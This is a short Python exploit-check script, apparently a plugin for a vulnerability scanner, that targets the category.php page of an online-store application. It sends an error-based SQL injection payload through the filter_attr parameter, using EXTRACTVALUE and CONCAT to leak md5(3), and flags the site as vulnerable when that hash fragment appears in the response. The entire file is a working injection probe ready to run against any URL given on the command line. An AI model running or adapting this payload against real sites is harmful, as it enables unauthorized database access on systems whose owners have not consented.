#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ='/category.php?page=1&sort=goods_id&order=ASC%23goods_list&category=1&display=grid&brand=0&price_min=0&price_max=0&filter_attr=-999%20AND%20EXTRACTVALUE(1218%2cCONCAT(0x5c%2c0x716f776c71%2c(MID((IFNULL(CA"ST(md5(3)%20AS%20CHAR)%2c0x20))%2c1%2c50))%2c0x7172737471))'
bug ="cbc87e4b5ce2fe28"
info = "/category.php?page=1&sort=goods_id&order=ASC%23goods_list&category=1&display=grid&brand=0&price_min=0&price_max=0&filter_attr=-999%20AND%20EXTRACTVALUE(1218%2cCONCAT(0x5c%2c0x716f776c71%2c(MID((IFNULL(CA"

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
